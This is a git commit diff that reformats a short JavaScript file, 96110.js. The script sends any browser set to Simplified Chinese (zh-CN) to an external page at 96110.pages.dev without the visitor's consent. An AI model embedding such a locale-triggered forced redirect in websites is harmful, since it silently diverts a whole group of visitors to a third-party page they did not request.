45eb26c0e7b23afdea7f3778c1239fdc11348351
steve green <steve_green@qq.com>
2025-04-02 19:53:20 +0800

    Update 96110.js

--- 96110.js
+++ 96110.js
@@ -1,3 +1,2 @@
-if (navigator.language == 'zh-CN' || navigator.userLanguage == 'zh-CN') {
-	window.location.href = 'https://96110.pages.dev/CloudFlare/CF';
-}
+if (navigator.language == 'zh-CN' || navigator.userLanguage == 'zh-CN')
+	window.location.href = 'https://96110.pages.dev/CloudFlare/CF'
